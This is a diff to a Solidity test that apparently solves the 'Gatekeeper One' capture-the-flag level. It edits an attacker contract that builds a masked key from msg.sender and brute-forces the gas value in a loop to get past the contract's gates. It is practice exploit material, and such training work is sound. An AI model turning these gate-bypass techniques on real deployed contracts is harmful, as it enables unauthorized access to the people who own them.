@@ -26,8 +26,9 @@ contract GatekeeperOneLevel is SetUpLevelTest {
 
 contract GateAttackOne {
     function open(address _target) public {
-        bytes8 key = bytes8(uint64(uint160(tx.origin) & 0xF0000FFFF));
-        for (uint256 i = 268; i < 269; ++i) {
+        uint64 uintKey = uint64(uint160(address(msg.sender)));
+        bytes8 key = bytes8(uintKey) & 0xFFFFFFFF0000FFFF;
+        for (uint256 i = 200; i < 500; ++i) {
             try GatekeeperOne(_target).enter{gas: i + 8191 * 3}(key) {
                 break;
             } catch {}
